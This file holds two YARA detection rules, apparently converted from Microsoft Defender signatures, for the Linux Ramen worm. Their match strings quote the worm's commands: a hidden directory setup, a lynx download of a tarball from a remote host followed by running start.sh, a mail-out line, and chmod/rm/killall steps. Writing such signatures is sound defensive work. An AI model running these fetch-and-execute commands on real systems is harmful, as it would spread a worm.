rule Worm_Linux_Ramen_DS_2147782921_0
{
    meta:
        author = "defender2yara"
        detection_name = "Worm:Linux/Ramen.DS!MTB"
        threat_id = "2147782921"
        type = "Worm"
        platform = "Linux: Linux platform"
        family = "Ramen"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "mkdir /usr/src/.poop;cd /usr/src/.poop" ascii //weight: 2
        $x_1_2 = "echo Eat Your Ramen! | maig -s %s -c %s %s" ascii //weight: 1
        $x_1_3 = "lynx -source http://%s:27374 > /usr/src/.poop/ramen.tgz" ascii //weight: 1
        $x_1_4 = "gzip -d ramen.tgz;tar -xvf ramen.tar;./start.sh" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Worm_Linux_Ramen_A_2147819259_0
{
    meta:
        author = "defender2yara"
        detection_name = "Worm:Linux/Ramen.A!xp"
        threat_id = "2147819259"
        type = "Worm"
        platform = "Linux: Linux platform"
        family = "Ramen"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "usage: %s address [-s][-e]" ascii //weight: 1
        $x_1_2 = "mail huckit@china.com <1i0n" ascii //weight: 1
        $x_1_3 = "exploit packet" ascii //weight: 1
        $x_1_4 = "killall -HUP inetd" ascii //weight: 1
        $x_1_5 = "chmod 755 lion" ascii //weight: 1
        $x_1_6 = "rm -fr 1i0n" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

